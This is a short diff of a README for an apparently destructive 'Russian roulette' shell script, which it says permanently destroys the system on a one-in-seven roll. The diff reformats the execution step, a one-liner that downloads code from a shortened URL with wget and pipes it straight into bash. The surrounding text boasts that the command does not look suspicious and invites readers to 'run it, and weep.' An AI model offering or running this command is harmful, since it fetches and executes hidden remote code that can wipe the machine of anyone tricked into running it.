@@ -6,6 +6,7 @@ Simple, and easy. Unstoppable once it has started. You can find the code [here.]
 It has seven barrels. If the random number is four, the system is __permanently destroyed.__
 
 ## Execution
-To run it type: > bash <(wget https://git.io/vArE3).
+To run it type: 
+> bash <(wget https://git.io/vArE3).
 It doesn't look suspicious, does it?
 Run it, and weep.
